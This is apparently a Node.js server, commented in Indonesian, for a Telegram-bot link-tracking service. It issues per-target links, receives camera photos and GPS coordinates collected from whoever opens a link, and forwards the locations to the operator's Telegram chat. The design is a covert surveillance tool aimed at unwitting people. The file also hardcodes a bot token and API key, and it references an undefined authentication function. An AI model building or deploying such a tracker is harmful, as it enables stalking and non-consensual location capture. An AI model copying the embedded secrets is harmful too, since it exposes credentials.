// server.js (Versi dengan Notifikasi Otomatis)

// Tambahkan axios untuk membuat HTTP request ke API Telegram
const axios = require('axios');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Ambil semua variabel yang dibutuhkan
const API_KEY = "KucingTerbangWarnaWarni123!"
const TELEGRAM_TOKEN = "6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc"

if (!API_KEY || !TELEGRAM_TOKEN) {
    console.error("FATAL ERROR: API_KEY dan TELEGRAM_TOKEN harus diatur di environment variables!");
    process.exit(1);
}

const tracking_data = {};

// --- Fungsi Baru untuk Kirim Notifikasi ---
async function sendTelegramNotification(chatId, alias, data) {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    
    try {
        // Kirim pesan teks sebagai notifikasi awal
        const messageText = `🔔 *Update Baru untuk ${alias}!*\n\nData diterima pada: ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
        await axios.post(`${telegramApiUrl}/sendMessage`, {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'Markdown'
        });

        // Kirim foto jika ada
        if (data.photoBase64) {
            const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            // Untuk mengirim foto via axios, kita butuh 'form-data'
            // Namun, cara lebih mudah adalah dengan mengirim referensi file atau URL.
            // Untuk kesederhanaan, kita akan kirim notifikasi teks saja di sini.
            // Mengirim foto akan membuat kode lebih kompleks.
        }

        // Kirim lokasi jika ada
        if (data.location) {
            await axios.post(`${telegramApiUrl}/sendLocation`, {
                chat_id: chatId,
                latitude: data.location.lat,
                longitude: data.location.lon
            });
        }
        console.log(`[SUCCESS] Notifikasi untuk ${alias} ke chat ID ${chatId} berhasil dikirim.`);
    } catch (error) {
        console.error(`[ERROR] Gagal mengirim notifikasi Telegram:`, error.response ? error.response.data : error.message);
    }
}


// --- Endpoint `/api/data` yang Ditingkatkan ---
app.post('/api/data', (req, res) => {
    const { link_id, data } = req.body;
    if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
    
    let found = false;
    for (const userId in tracking_data) {
        for (const alias in tracking_data[userId]) {
            if (tracking_data[userId][alias].link_id === link_id) {
                // Simpan data
                const current_data = { ...data, timestamp: new Date().toISOString() };
                tracking_data[userId][alias].last_data = current_data;
                found = true;
                console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
                
                // Panggil fungsi notifikasi!
                sendTelegramNotification(userId, alias, current_data);

                break;
            }
        }
        if (found) break;
    }

    if (found) {
        res.json({ status: "sukses" });
    } else {
        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
    }
});

// --- API Endpoints untuk Bot Telegram (Diproteksi) ---

app.post('/api/create_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (!user_id || !alias) {
        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
    }

    const link_id = uuidv4();
    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;

    if (!tracking_data[user_id]) {
        tracking_data[user_id] = {};
    }
    
    tracking_data[user_id][alias] = {
        link_id: link_id,
        last_data: null,
        link: link_url,
        created_at: new Date().toISOString()
    };
    
    console.log(`[INFO] Link dibuat untuk user ${user_id} dengan alias ${alias}`);
    res.json({ status: "sukses", link: link_url });
});

app.get('/api/list_links/:user_id', apiKeyAuth, (req, res) => {
    const { user_id } = req.params;
    const userLinks = tracking_data[user_id];
    if (!userLinks) {
        return res.json({ status: "sukses", links: {} });
    }
    const linksToReturn = Object.keys(userLinks).map(alias => ({
        alias: alias,
        link: userLinks[alias].link,
        has_data: !!userLinks[alias].last_data
    }));
    res.json({ status: "sukses", links: linksToReturn });
});

app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.params;
    const trackingInfo = tracking_data[user_id]?.[alias];

    if (trackingInfo && trackingInfo.last_data) {
        res.json({ status: "sukses", data: trackingInfo.last_data });
    } else {
        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan." });
    }
});

app.post('/api/delete_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (tracking_data[user_id]?.[alias]) {
        delete tracking_data[user_id][alias];
        console.log(`[INFO] Link untuk alias ${alias} dari user ${user_id} telah dihapus.`);
        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
    } else {
        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
    }
});

app.listen(PORT, () => {
    console.log(`Server pelacakan berjalan di port ${PORT}`);
});
